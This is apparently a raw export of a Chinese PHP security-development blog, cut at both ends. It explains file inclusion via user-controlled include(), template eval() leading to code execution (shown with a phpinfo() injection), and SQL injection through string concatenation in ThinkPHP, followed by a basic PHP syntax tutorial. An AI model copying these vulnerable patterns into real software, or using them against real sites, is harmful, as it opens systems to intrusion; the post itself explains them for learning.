class="string">&quot;&lt;li&gt;&lt;i class=&#x27;fa fa-folder&#x27;&gt;&lt;/i&gt; &lt;a href=&#x27;?path=<span class="subst">$dir</span>/<span class="subst">$file</span>&#x27;&gt;&quot;</span> . <span class="variable">$file</span> . <span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果是文件，显示文件图标和链接</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;li&gt;&lt;i class=&quot;fa fa-file&quot;&gt;&lt;/i&gt; &lt;a href=&quot;#&quot;&gt;&#x27;</span> . <span class="variable">$file</span> . <span class="string">&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭目录句柄</span></span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$dh</span>);</span><br><span class="line">    &#125;**</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数显示目录文件列表</span></span><br><span class="line"><span class="title function_ invoke__">filelist</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>while</strong>循环迭代目录中的每个条目。</p><p>**readdir($dh)**读取目录中的下一个条目。</p><p>循环继续，直到没有更多的条目（readdir返回false）。</p><p>在循环内部，<strong>is_dir($dir . ‘&#x2F;‘ . $file)检查当前目录项是否是一个目录，通过构建完整路径并使用is_dir</strong>函数来判断。</p><p>条件通过使用斜杠（&#x2F;）将目录路径（$dir）与当前目录项（$file）连接起来，形成完整的路径。</p></blockquote><h3 id="PHP-INI目录访问控制"><a href="#PHP-INI目录访问控制" class="headerlink" title="PHP.INI目录访问控制"></a>PHP.INI目录访问控制</h3><p>目的是避免目录穿越，限制目录访问范围</p><p>php的配置文件</p><p>open_basedir</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731670030947-1ee20227-0bd4-49a2-9bf9-e70ea170f8b5.png"></p><p>规定了目录访问的根目录，我们不能跳出该目录查看其它文件内容</p><blockquote><p>php配置文件前面有；则为被注释（不生效）</p></blockquote><h2 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>() 在错误发生后脚本继续执行</span><br><span class="line"><span class="keyword">require</span>() 在错误发生后脚本停止执行</span><br><span class="line"><span class="keyword">include_once</span>() 如果已经包含，则不再执行</span><br><span class="line"><span class="keyword">require_once</span>() 如果已经包含，则不再执行</span><br></pre></td></tr></table></figure><p>如果使用文件包含函数，并且函数的参数为用户可控</p><p>比如</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])</span><br></pre></td></tr></table></figure><p>用户可以通过手动修改page的参数来进行任意文件包含</p><h2 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>() 读取文件内容</span><br><span class="line"><span class="title function_ invoke__">fopen</span>() <span class="title function_ invoke__">fread</span>() 文件打开读入</span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">unlink</span>() 文件删除函数</span><br><span class="line">调用命令删除：system shell_exec exec等</span><br></pre></td></tr></table></figure><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">修改HTTP头实现文件读取解析下载：</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">header(&quot;</span>Content-<span class="attr">Length</span>: <span class="string">&quot; . filesize(<span class="subst">$file</span>));</span></span><br><span class="line"><span class="string">readfile(<span class="subst">$file</span>);</span></span><br></pre></td></tr></table></figure><h1 id="新闻列表-模版引用"><a href="#新闻列表-模版引用" class="headerlink" title="新闻列表&amp;模版引用"></a>新闻列表&amp;模版引用</h1><h2 id="自写模板"><a href="#自写模板" class="headerlink" title="自写模板"></a>自写模板</h2><p>模板：由于牵涉到美观问题，将php代码中插入html代码以达到更美观，而当我们使用模板时，对于模板相应的位置进行替换即可</p><p>模板要被调用运行，有eval函数，可能存在RCE</p><p>第三方模板安全性较高，查看网上是否爆出相关版本漏洞</p><blockquote><p>插件能做到哪些功能，需要用到哪些函数，这些函数会引发什么安全漏洞</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">**<span class="comment">// 从文件中读取HTML模板内容</span></span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;new.html&#x27;</span>);**</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用mysqli_fetch_row遍历结果集的每一行</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">    <span class="comment">// 从结果集中获取每一列的值，并存储到相应的变量中</span></span><br><span class="line">    <span class="variable">$page_title</span> = <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$heading</span> = <span class="variable">$row</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$subheading</span> = <span class="variable">$row</span>[<span class="number">3</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$row</span>[<span class="number">4</span>];</span><br><span class="line">    <span class="variable">$item</span> = <span class="variable">$row</span>[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换HTML模板中的占位符</span></span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;page_title&#125;&#x27;</span>, <span class="variable">$page_title</span>, <span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;heading&#125;&#x27;</span>, <span class="variable">$subheading</span>, <span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;subheading&#125;&#x27;</span>, <span class="variable">$subheading</span>, <span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;content&#125;&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;$item&#125;&#x27;</span>, <span class="variable">$item</span>, <span class="variable">$template</span>);</span><br><span class="line"></span><br><span class="line">**<span class="comment">// 将PHP代码嵌入HTML模板中并执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span> . <span class="variable">$template</span>);**</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br></pre></td></tr></table></figure><p><font style="background-color:rgba(255, 255, 255, 0);">如果在数据库中任何地方添加</font><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&lt;?php phpinfo();?&gt;&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);"> ，在调用数据库内容的时候会自动显示</font></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731723045812-d589a70e-ee23-4cac-b27a-5e9c8b8b20b8.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731723045810-db95641a-0961-469b-8d1d-e5c9b5cda432.png"></p><p><font style="background-color:rgba(255, 255, 255, 0);">如果在html模板源码中加入</font><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&lt;?php phpinfo();?&gt;&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);"> ，在执行HTML并不会显示，但通过php解析调用，则依然会展示有关内容</font></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731723045658-c5b865b9-4535-4e8e-8632-d1b71d31c763.png"></p><p>php代码解析调用，存在RCE</p><h2 id="Smarty模板"><a href="#Smarty模板" class="headerlink" title="Smarty模板"></a>Smarty模板</h2><p>smarty模板使用</p><blockquote><p>使用：</p><p>1、创建一个文件夹，命名为smarty</p><p>2、下载Smarty对应版本并解压缩到该文件夹中。</p><p>3、创建一个PHP文件，命名为index.php，并在文件中添加以下代码：</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入 Smarty 类文件</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;smarty/libs/Smarty.class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 Smarty 实例</span></span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 Smarty 相关属性</span></span><br><span class="line">**<span class="variable">$smarty</span>-&gt;template_dir = <span class="string">&#x27;smarty/templates/&#x27;</span>;  <span class="comment">// 设置模板文件的目录**</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;compile_dir = <span class="string">&#x27;smarty/templates_c/&#x27;</span>;  <span class="comment">// 设置编译文件的目录</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;cache_dir = <span class="string">&#x27;smarty/cache/&#x27;</span>;  <span class="comment">// 设置缓存文件的目录</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;config_dir = <span class="string">&#x27;smarty/configs/&#x27;</span>;  <span class="comment">// 设置配置文件的目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值变量到模板中</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;欢迎使用 Smarty&#x27;</span>);  <span class="comment">// 将变量 &#x27;title&#x27; 赋值为 &#x27;欢迎使用 Smarty&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示模板</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;index.tpl&#x27;</span>);  <span class="comment">// 使用 &#x27;index.tpl&#x27; 模板文件进行显示</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>路径要进行更改，index.tpl要自行创建</p><p>4、在smarty相关目录下创建smarty&#x2F;templates&#x2F; 并在目录下创建一个名为index.tpl的模板文件，并将以下代码复制到上述点定义文件夹中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&#123;<span class="variable">$title</span>&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;&#123;<span class="variable">$title</span>&#125;&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;这是一个使用 Smarty 的例子。&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在网上查找相关版本漏洞</p><h1 id="框架ThinkPHP（TP）"><a href="#框架ThinkPHP（TP）" class="headerlink" title="框架ThinkPHP（TP）"></a>框架ThinkPHP（TP）</h1><p>MVC：model view controller（模板、视图、控制器）</p><p><a href="https://doc.thinkphp.cn/v8_0/preface.html">ThinkPHP官方手册</a></p><h2 id="路由访问"><a href="#路由访问" class="headerlink" title="路由访问"></a>路由访问</h2><p>路由访问，要规定路由关系</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731726233113-32bd184f-a7a8-41cc-9d18-db6c03879f3c.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731724703163-3602b946-b71f-4d25-9b9c-2f4051da6bee.png"></p><blockquote><p>两种访问方式</p><ul><li><a href="http://192.168.137.1:84/index.php/Index/index/xi/name/xiaosedi"><font style="color:rgba(0, 0, 0, 0.75);">192.168.137.1:84&#x2F;index.php&#x2F;Index&#x2F;index&#x2F;xi&#x2F;name&#x2F;xiaosedi</font></a><font style="color:rgba(0, 0, 0, 0.75);">（路由）</font></li><li><a href="http://192.168.137.1:84/index.php/Index/index/xi?name=wusuowei"><font style="color:rgba(0, 0, 0, 0.75);">192.168.137.1:84&#x2F;index.php&#x2F;Index&#x2F;index&#x2F;xi?name&#x3D;wusuowei</font></a><font style="color:rgba(0, 0, 0, 0.75);">（传统传参）</font></li></ul></blockquote><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p>使用TP框架操作数据库，默认是受到框架内置过滤保护，语句写法会改变</p><p>1.连接数据库找到数据库配置文件（database.php），并打开调试模式</p><p>2.引用数据的的类use think\Db;，使用数据库的查询语句</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testsql</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="comment">//SELECT * FROM `think_user` WHERE  `id` = 1 LIMIT 1</span></span><br><span class="line">        <span class="comment">// table方法必须指定完整的数据表名</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;news&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;id&#x27;</span>, <span class="number">1</span>)-&gt;<span class="title function_ invoke__">findOrFail</span>();</span><br><span class="line">      <span class="comment">//写法改变</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731726439389-f2197437-f427-4f9a-88a1-7d9c8fdd6a11.png" alt="数据库配置文件"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>网站根目录创建upload.html</p><p>写入表单代码，并修改action的值</p><p>创建php文件并写入控制器代码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731726743093-8818d9c1-700b-40b1-8709-ba357169d259.png"></p><h2 id="前端页面渲染view"><a href="#前端页面渲染view" class="headerlink" title="前端页面渲染view"></a>前端页面渲染view</h2><p><font style="background-color:rgba(255, 255, 255, 0);">在例如index（需要渲染的文件当前并行目录下）→view→index→index.html等</font></p><p><font style="background-color:rgba(255, 255, 255, 0);"><a href="http://192.168.137.1:84/index.php/Index/index/index">http://192.168.137.1:84/index.php/Index/index/index</a> 输入对应的路由访问即可看到以及渲染的页面</font></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731726903885-283314b5-8976-427b-bb25-815eaf50ffa8.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731726903908-dfbdd4fa-6114-4af7-9703-cccf54b334c0.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731726903999-ded5e01a-a9d8-4fbc-ae89-095bf57b120e.png"></p><p><font style="background-color:rgba(255, 255, 255, 0);">也可以指定内容可以指定模板</font></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        **<span class="comment">//可以一一赋值</span></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;ThinkPHP&#x27;</span>);</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;thinkphp@qq.com&#x27;</span>);</span><br><span class="line">        <span class="comment">//可以批量赋值</span></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>([</span><br><span class="line">          <span class="string">&#x27;name&#x27;</span> == <span class="string">&#x27;ThinkPHP&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;email&#x27;</span> == <span class="string">&#x27;thinkphp@qq.com&#x27;</span></span><br><span class="line">       ]);</span><br><span class="line">       <span class="comment">//模板输出</span></span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;index/edit&#x27;</span>);**</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><p>think还提供了原生写法</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731727095107-ffa5c5d1-edb6-4115-b5c4-b06eb619b796.png"></p><p>如果使用原生写法，仍然存在安全漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">param</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;news&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;id&#x27;</span>,<span class="variable">$id</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用一半安全写法 有安全隐患</span></span><br><span class="line">   <span class="variable">$id</span>=<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">param</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">   <span class="variable">$data</span>=<span class="title class_">Db</span>::<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from news where id=<span class="subst">$id</span>&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础</title>
      <link href="/2025/05/27/PHP%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/05/27/PHP%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>php可以嵌入在HTML语言中进行编写</p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h2><p>php标记</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//内容</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">如果整个php文件中都是php代码的话，后面的 <span class="meta">?&gt;</span> 可以省略</span><br></pre></td></tr></table></figure><p>指令分隔符<code>;</code>&#x2F;&#x2F;每行php代码都要以<code>;</code>结尾</p><p>注释</p><p>单行注释<code>//注释内容</code></p><p>多行注释<code>/*注释内容*/</code></p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>php是弱类型，定义变量时不需要声明变量类型，输入<code>$和变量名</code>即可</p><blockquote><p>双引号中的变量才可以输出值</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718373914095-60816bfd-0fcc-48f8-9070-3cab07afcae7.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718373924378-8a6c3841-99e5-49b5-877a-afeb6a19edff.png"></p><h3 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h3><ol><li>变量以$符号开始，后面跟着变量的名称；</li><li>变量名必须以字母或者下划线字符开始；</li><li>变量名只能包含字母、数字以及下划线（Az、09和_）；</li><li>变量名不能包含空格；</li><li>变量名是区分大小写的（$y和$Y是两个不同的变量）</li></ol><h3 id="页面输出"><a href="#页面输出" class="headerlink" title="页面输出"></a>页面输出</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>  输出单一类型，多个用逗号隔开</span><br><span class="line"><span class="title function_ invoke__">print_r</span>()  输出符合类型，一般用于输出数组</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>()  打印数据详细信息</span><br></pre></td></tr></table></figure><h2 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h2><ul><li>String（字符串）</li><li>Integer（整型）</li><li>Float（浮点型）</li><li>Boolean（布尔型）</li><li>NULL（空）</li></ul><h3 id="String（字符串类型）"><a href="#String（字符串类型）" class="headerlink" title="String（字符串类型）"></a>String（字符串类型）</h3><p>纯文本，可以将任何文本放在单引号和双引号中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$name</span> = <span class="string">&#x27;han&#x27;</span>;  </span><br><span class="line">    <span class="variable">$str1</span> = <span class="string">&quot;PHP is the best language!&quot;</span>;  </span><br><span class="line">    <span class="variable">$str2</span> = <span class="string">&quot;My name is <span class="subst">$name</span>.&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str1</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str2</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718373808131-86f4d58c-6cdc-422c-80c5-1791ae595fba.png"></p><h3 id="Integer（整型）"><a href="#Integer（整型）" class="headerlink" title="Integer（整型）"></a>Integer（整型）</h3><p>正数或负数，可以指定进制为：十进制，十六进制（0x前缀），八进制（0前缀）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="variable">$num2</span>=-<span class="number">20</span>;</span><br><span class="line"><span class="variable">$num3</span>=<span class="number">024</span>;</span><br><span class="line"><span class="variable">$num4</span>=<span class="number">0x14</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718374211394-43827405-0012-48be-a43b-dfdff0cca647.png"></p><h3 id="Float（浮点型）"><a href="#Float（浮点型）" class="headerlink" title="Float（浮点型）"></a>Float（浮点型）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$f1</span> = <span class="number">20.123</span>;  </span><br><span class="line"><span class="variable">$f2</span> = <span class="number">2.0123e1</span>; <span class="comment">// 科学计数法表示  2.0123*10^1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$f1</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$f2</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718374409084-002f2ab0-1529-4df9-9c7b-93f7001f8b31.png"></p><h3 id="Boolean（布尔类型）"><a href="#Boolean（布尔类型）" class="headerlink" title="Boolean（布尔类型）"></a>Boolean（布尔类型）</h3><p>大小写都可以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$a</span> = <span class="literal">true</span>;  </span><br><span class="line">    <span class="variable">$b</span> = <span class="number">1</span>;  </span><br><span class="line">    <span class="variable">$c</span> = <span class="number">2</span>;  </span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);  </span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span> == <span class="variable">$c</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718374508352-da9a2cfb-cfe6-43a9-91f2-9fc2b9c7d431.png"></p><h3 id="NULL（空）"><a href="#NULL（空）" class="headerlink" title="NULL（空）"></a>NULL（空）</h3><p>变量为空</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$n</span> = <span class="literal">null</span>;  </span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$n</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718374616388-c68b45a4-7862-4d5a-9e73-f610a03a6272.png"></p><h2 id="其他数据类型"><a href="#其他数据类型" class="headerlink" title="其他数据类型"></a>其他数据类型</h2><p>复合数据类型</p><ul><li>Array（数组）</li><li>Object（对象）</li></ul><p>特殊数据类型</p><ul><li>Resource（资源）</li></ul><h1 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h1><h2 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h2><p>并置运算符<code>.</code>，用于拼接两个字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$str1</span> = <span class="string">&quot;hello&quot;</span>;  </span><br><span class="line">    <span class="variable">$str2</span> = <span class="string">&quot;world&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str1</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$str2</span>; <span class="comment">// $str1拼接上一个空格，再拼接上$str2  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718374881384-9240c808-523d-44b6-8846-3647bb70e9c8.png"></p><h2 id="内置字符串处理函数"><a href="#内置字符串处理函数" class="headerlink" title="内置字符串处理函数"></a>内置字符串处理函数</h2><h3 id="strlen-字符串长度"><a href="#strlen-字符串长度" class="headerlink" title="strlen()字符串长度"></a>strlen()字符串长度</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;hello&quot;</span>;  </span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;world&quot;</span>;  </span><br><span class="line"><span class="variable">$str3</span> = <span class="variable">$str1</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$str2</span>; <span class="comment">// $str1拼接上一个空格，再拼接上$str2  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str1</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718374968194-4c7de4ed-ae78-4c72-8465-5a776a604db3.png"></p><h3 id="strrev-反转字符串"><a href="#strrev-反转字符串" class="headerlink" title="strrev()反转字符串"></a>strrev()反转字符串</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;han&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718375137990-69639fee-3b51-40eb-81f7-77aade452c50.png"></p><h3 id="字符串大小写转换"><a href="#字符串大小写转换" class="headerlink" 